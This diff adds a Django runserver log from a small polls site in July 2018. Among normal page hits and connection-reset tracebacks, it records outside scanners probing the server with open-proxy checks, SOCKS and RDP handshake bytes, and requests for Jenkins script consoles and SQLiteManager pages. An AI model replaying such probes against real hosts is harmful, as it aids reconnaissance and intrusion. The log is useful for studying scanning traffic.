+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+TimeoutError: [Errno 110] Connection timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 647, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 357, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 717, in __init__
+    self.handle()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/local/python3/lib/python3.7/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Not Found: /
+[13/Jul/2018 19:03:58] "GET / HTTP/1.1" 404 2032
+[13/Jul/2018 22:22:23] "GET /polls/home/ HTTP/1.1" 200 2097
+[13/Jul/2018 22:22:23] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[13/Jul/2018 22:22:24] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[13/Jul/2018 22:22:24] "GET /favicon.ico HTTP/1.1" 404 2083
+[13/Jul/2018 22:41:26] "GET /polls/home/ HTTP/1.1" 200 2097
+Invalid HTTP_HOST header: 'check.proxyradar.com'. You may need to add 'check.proxyradar.com' to ALLOWED_HOSTS.
+[13/Jul/2018 23:43:53] "POST http://check.proxyradar.com/azenv.php?auth=153149663361&a=PSCMN&i=1815985070&p=8000 HTTP/1.1" 400 61131
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[13/Jul/2018 23:57:51] "HEAD / HTTP/1.0" 400 58383
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 04:12:52] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58653
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 07:55:40] "HEAD / HTTP/1.0" 400 58382
+[14/Jul/2018 16:37:20] "GET /polls/home/ HTTP/1.1" 200 2097
+[14/Jul/2018 16:37:20] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[14/Jul/2018 16:37:21] "GET /favicon.ico HTTP/1.1" 404 2083
+Not Found: /
+[14/Jul/2018 17:19:08] "GET / HTTP/1.1" 404 2032
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 19:09:02] "HEAD / HTTP/1.0" 400 58382
+[14/Jul/2018 20:52:45] "GET /polls/home/ HTTP/1.1" 200 2097
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 21:08:58] "HEAD / HTTP/1.0" 400 58384
+Invalid HTTP_HOST header: 'httpheader.net'. You may need to add 'httpheader.net' to ALLOWED_HOSTS.
+[14/Jul/2018 21:09:40] "GET http://httpheader.net/ HTTP/1.1" 400 59866
+[14/Jul/2018 21:10:11] code 400, message Bad request syntax ('\x04\x01\x00PÀcö60\x00')
+[14/Jul/2018 21:10:12] " PÀcö60 " 400 -
+[14/Jul/2018 21:10:43] code 400, message Bad request syntax ('\x05\x01\x00')
+[14/Jul/2018 21:10:43] " " 400 -
+[14/Jul/2018 21:33:44] "GET /polls/home/ HTTP/1.1" 200 2097
+[14/Jul/2018 21:34:00] "GET /polls/home/?searchtext=112.85.42.147 HTTP/1.1" 200 2097
+[14/Jul/2018 21:34:04] "GET /polls/home/?searchtext=nice+job HTTP/1.1" 200 2097
+[14/Jul/2018 21:34:15] "GET /polls/home/?searchtext=112.85.42.147 HTTP/1.1" 200 2097
+[14/Jul/2018 21:34:23] "GET /polls/home/?searchtext=112.85.42.147 HTTP/1.1" 200 2097
+[14/Jul/2018 21:36:02] "GET /polls/home/ HTTP/1.1" 200 2097
+[14/Jul/2018 21:36:02] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+[14/Jul/2018 21:36:02] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[14/Jul/2018 21:36:02] "GET /favicon.ico HTTP/1.1" 404 2083
+----------------------------------------
+Exception happened during processing of request from ('183.192.8.125', 7947)
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 647, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 357, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 717, in __init__
+    self.handle()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/local/python3/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 21:52:49] "HEAD / HTTP/1.0" 400 58384
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 23:42:30] "HEAD / HTTP/1.0" 400 58381
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 23:42:32] "HEAD / HTTP/1.0" 400 58381
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 23:42:33] "HEAD / HTTP/1.0" 400 58381
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 23:42:38] "HEAD / HTTP/1.0" 400 58381
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 23:42:46] "HEAD / HTTP/1.0" 400 58381
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[14/Jul/2018 23:53:05] "HEAD / HTTP/1.0" 400 58384
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[15/Jul/2018 00:17:41] "HEAD / HTTP/1.0" 400 58385
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[15/Jul/2018 02:18:31] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58653
+Not Found: /
+[15/Jul/2018 08:28:01] "GET / HTTP/1.1" 404 2032
+Not Found: /
+[15/Jul/2018 08:34:03] "GET / HTTP/1.1" 404 2032
+Not Found: /
+[15/Jul/2018 08:34:03] "GET / HTTP/1.1" 404 2032
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[15/Jul/2018 13:51:29] "HEAD / HTTP/1.0" 400 58384
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[15/Jul/2018 16:46:40] "GET / HTTP/1.0" 400 58376
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[15/Jul/2018 22:24:06] "HEAD / HTTP/1.0" 400 58385
+Not Found: /
+[16/Jul/2018 00:15:08] "GET / HTTP/1.1" 404 2032
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[16/Jul/2018 00:45:27] "HEAD / HTTP/1.0" 400 58382
+Not Found: /
+[16/Jul/2018 02:14:14] "GET / HTTP/1.1" 404 2032
+Invalid HTTP_HOST header: 'www.msftncsi.com'. You may need to add 'www.msftncsi.com' to ALLOWED_HOSTS.
+[16/Jul/2018 02:14:15] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 400 59407
+Invalid HTTP_HOST header: 'www.msftncsi.com'. You may need to add 'www.msftncsi.com' to ALLOWED_HOSTS.
+[16/Jul/2018 02:14:16] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 400 59407
+Invalid HTTP_HOST header: 'www.msftncsi.com'. You may need to add 'www.msftncsi.com' to ALLOWED_HOSTS.
+[16/Jul/2018 02:14:18] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 400 59407
+Not Found: /HNAP1/
+[16/Jul/2018 02:14:18] "GET /HNAP1/ HTTP/1.1" 404 2068
+Not Found: /hudson/script
+[16/Jul/2018 02:14:19] "GET /hudson/script HTTP/1.1" 404 2089
+Not Found: /script
+[16/Jul/2018 02:14:20] "GET /script HTTP/1.1" 404 2068
+Not Found: /sqlite/main.php
+[16/Jul/2018 02:14:20] "GET /sqlite/main.php HTTP/1.1" 404 2095
+Not Found: /sqlitemanager/main.php
+[16/Jul/2018 02:14:21] "GET /sqlitemanager/main.php HTTP/1.1" 404 2116
+Not Found: /SQLiteManager/main.php
+[16/Jul/2018 02:14:22] "GET /SQLiteManager/main.php HTTP/1.1" 404 2116
+Not Found: /SQLite/main.php
+[16/Jul/2018 02:14:22] "GET /SQLite/main.php HTTP/1.1" 404 2095
+Not Found: /SQlite/main.php
+[16/Jul/2018 02:14:23] "GET /SQlite/main.php HTTP/1.1" 404 2095
+Not Found: /main.php
+[16/Jul/2018 02:14:23] "GET /main.php HTTP/1.1" 404 2074
+Not Found: /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php
+[16/Jul/2018 02:14:24] "GET /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php HTTP/1.1" 404 2230
+Not Found: /SQLiteManager-1.2.4/main.php
+[16/Jul/2018 02:14:25] "GET /SQLiteManager-1.2.4/main.php HTTP/1.1" 404 2134
+Not Found: /agSearch/SQlite/main.php
+[16/Jul/2018 02:14:25] "GET /agSearch/SQlite/main.php HTTP/1.1" 404 2122
+Invalid HTTP_HOST header: 'httpheader.net'. You may need to add 'httpheader.net' to ALLOWED_HOSTS.
+[16/Jul/2018 07:30:36] "GET http://httpheader.net/ HTTP/1.1" 400 59866
+[16/Jul/2018 07:31:08] code 400, message Bad request syntax ('\x04\x01\x00PÀcö60\x00')
+[16/Jul/2018 07:31:08] " PÀcö60 " 400 -
+[16/Jul/2018 07:31:40] code 400, message Bad request syntax ('\x05\x01\x00')
+[16/Jul/2018 07:31:40] " " 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[16/Jul/2018 08:49:39] "HEAD / HTTP/1.0" 400 58382
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[16/Jul/2018 09:11:50] "HEAD / HTTP/1.0" 400 58384
+[16/Jul/2018 15:46:37] code 400, message Bad request version ('F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+[16/Jul/2018 15:46:37] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+[16/Jul/2018 20:32:57] "GET /polls/home/ HTTP/1.1" 200 2097
+[16/Jul/2018 20:32:57] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[16/Jul/2018 20:32:57] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[16/Jul/2018 20:32:57] "GET /favicon.ico HTTP/1.1" 404 2083
+[16/Jul/2018 23:53:36] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[16/Jul/2018 23:53:36] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[17/Jul/2018 04:16:08] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58653
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[17/Jul/2018 07:51:39] "GET / HTTP/1.0" 400 58377
+[17/Jul/2018 08:19:17] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[17/Jul/2018 08:19:17] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[17/Jul/2018 08:24:40] "HEAD / HTTP/1.0" 400 58382
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[17/Jul/2018 13:02:06] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58653
+[17/Jul/2018 16:20:16] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 16:20:17] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[17/Jul/2018 16:20:17] "GET /static/polls/style_home.css HTTP/1.1" 200 209
+Not Found: /favicon.ico
+[17/Jul/2018 16:20:18] "GET /favicon.ico HTTP/1.1" 404 2083
+[17/Jul/2018 16:23:44] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 16:23:45] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[17/Jul/2018 16:23:45] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[17/Jul/2018 16:23:46] "GET /favicon.ico HTTP/1.1" 404 2083
+[17/Jul/2018 16:34:02] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:03:56] "GET /polls/home/ HTTP/1.1" 200 2097
+Not Found: /favicon.ico
+[17/Jul/2018 21:03:57] "GET /favicon.ico HTTP/1.1" 404 2083
+[17/Jul/2018 21:16:58] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[17/Jul/2018 21:21:07] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:09] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:09] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:10] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:10] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:10] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:11] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:11] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:11] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:13] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:21:25] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:22:34] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:22:34] "GET /static/polls/style_home.css HTTP/1.1" 200 244
+[17/Jul/2018 21:22:34] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[17/Jul/2018 21:22:43] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:22:43] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[17/Jul/2018 21:22:44] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:27:25] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:27:25] "GET /static/polls/style_home.css HTTP/1.1" 200 234
+[17/Jul/2018 21:28:06] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:28:07] "GET /static/polls/style_home.css HTTP/1.1" 200 197
+[17/Jul/2018 21:28:51] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:28:52] "GET /static/polls/style_home.css HTTP/1.1" 200 236
+[17/Jul/2018 21:33:01] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:33:01] "GET /static/polls/style_home.css HTTP/1.1" 200 258
+[17/Jul/2018 21:33:06] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:33:07] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[17/Jul/2018 21:33:07] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:33:08] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[17/Jul/2018 21:36:01] "GET /polls/home/ HTTP/1.1" 200 2097
+[17/Jul/2018 21:36:01] "GET /static/polls/style_home.css HTTP/1.1" 200 291
+[17/Jul/2018 21:37:23] "GET /polls/home/ HTTP/1.1" 200 2108
+[17/Jul/2018 21:37:23] "GET /static/polls/style_home.css HTTP/1.1" 200 296
+[17/Jul/2018 21:37:28] "GET /polls/home/ HTTP/1.1" 200 2108
+[17/Jul/2018 21:37:28] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[17/Jul/2018 21:37:52] "GET /polls/home/ HTTP/1.1" 200 2108
+[17/Jul/2018 21:37:52] "GET /static/polls/style_home.css HTTP/1.1" 200 271
+[17/Jul/2018 21:37:52] "GET /polls/home/ HTTP/1.1" 200 2108
+[17/Jul/2018 21:37:53] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[17/Jul/2018 21:37:53] "GET /polls/home/ HTTP/1.1" 200 2108
+[17/Jul/2018 21:37:53] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[17/Jul/2018 21:37:53] "GET /polls/home/ HTTP/1.1" 200 2108
+[17/Jul/2018 21:37:53] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[17/Jul/2018 21:37:53] "GET /polls/home/ HTTP/1.1" 200 2108
+[17/Jul/2018 21:37:54] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[18/Jul/2018 00:57:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[18/Jul/2018 00:57:58] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[18/Jul/2018 04:49:13] "GET / HTTP/1.0" 400 58375
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[18/Jul/2018 04:49:13] "GET / HTTP/1.0" 500 59
+----------------------------------------
+Exception happened during processing of request from ('114.32.247.3', 55558)
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 796, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
+    super().handle_error()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 647, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 357, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python3/lib/python3.7/socketserver.py", line 717, in __init__
+    self.handle()
+  File "/usr/local/python3/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
+    handler.run(self.server.get_app())
+  File "/usr/local/python3/lib/python3.7/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/local/python3/lib/python3.7/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[18/Jul/2018 04:51:27] "HEAD / HTTP/1.0" 400 58382
+[18/Jul/2018 07:06:53] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[18/Jul/2018 07:06:53] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[18/Jul/2018 11:35:14] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58653
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[18/Jul/2018 13:30:30] "HEAD / HTTP/1.0" 400 58384
+Not Found: /
+[18/Jul/2018 16:26:33] "GET / HTTP/1.1" 404 2032
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[18/Jul/2018 16:40:43] "HEAD / HTTP/1.0" 400 58383
+[18/Jul/2018 22:07:55] "GET /polls/home/ HTTP/1.1" 200 2108
+[18/Jul/2018 22:07:55] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[18/Jul/2018 22:07:56] "GET /favicon.ico HTTP/1.1" 404 2083
+[18/Jul/2018 22:08:03] "GET /polls/home/ HTTP/1.1" 200 2108
+[18/Jul/2018 22:08:03] "GET /static/polls/style_home.css HTTP/1.1" 200 271
+[18/Jul/2018 22:08:03] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[19/Jul/2018 01:57:38] "HEAD / HTTP/1.0" 400 58384
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[19/Jul/2018 04:27:16] "POST / HTTP/1.0" 400 58515
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[19/Jul/2018 07:55:04] "HEAD / HTTP/1.0" 400 58383
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[19/Jul/2018 09:27:39] "HEAD / HTTP/1.0" 400 58384
+Not Found: /
+[19/Jul/2018 10:03:40] "GET / HTTP/1.1" 404 2032
+Not Found: /
+[19/Jul/2018 10:03:42] "GET / HTTP/1.1" 404 2032
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[19/Jul/2018 10:30:24] "HEAD / HTTP/1.0" 400 58383
+[19/Jul/2018 17:10:17] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 17:10:18] "GET /static/polls/style_home.css HTTP/1.1" 200 271
+[19/Jul/2018 17:10:18] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Not Found: /favicon.ico
+[19/Jul/2018 17:10:20] "GET /favicon.ico HTTP/1.1" 404 2083
+[19/Jul/2018 17:10:47] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 17:17:33] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 17:17:35] "GET /polls/home/ HTTP/1.1" 200 2107
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[19/Jul/2018 17:41:52] "HEAD / HTTP/1.0" 400 58384
+[19/Jul/2018 18:23:11] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 18:23:14] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 18:23:15] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 18:23:16] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 18:23:39] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 18:24:17] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 18:24:18] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 18:25:29] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 18:25:30] "GET /static/polls/style_home.css HTTP/1.1" 200 226
+[19/Jul/2018 18:25:31] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+[19/Jul/2018 18:26:04] "GET /static/polls/style_home.css HTTP/1.1" 304 0
+[19/Jul/2018 18:26:49] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 18:26:49] "GET /static/polls/style_home.css HTTP/1.1" 200 226
+[19/Jul/2018 18:26:50] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[19/Jul/2018 18:39:51] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 58653
+Invalid HTTP_HOST header: 'localhost.localdomain:8000'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[19/Jul/2018 18:59:07] "HEAD / HTTP/1.0" 400 58384
+[19/Jul/2018 21:42:10] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 21:42:10] "GET /static/polls/style_home.css HTTP/1.1" 200 226
+Not Found: /favicon.ico
+[19/Jul/2018 21:42:11] "GET /favicon.ico HTTP/1.1" 404 2083
+[19/Jul/2018 21:42:24] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 21:42:24] "GET /static/polls/style_home.css HTTP/1.1" 200 226
+[19/Jul/2018 21:42:25] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[19/Jul/2018 21:55:54] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 21:55:54] "GET /static/polls/style_home.css HTTP/1.1" 200 231
+[19/Jul/2018 21:55:54] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[19/Jul/2018 21:56:33] "GET /polls/home/ HTTP/1.1" 200 2107
+[19/Jul/2018 21:56:33] "GET /static/polls/style_home.css HTTP/1.1" 200 231
+[19/Jul/2018 21:56:34] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 47923
+[19/Jul/2018 22:05:02] "GET /polls/home/ HTTP/1.1" 200 2107
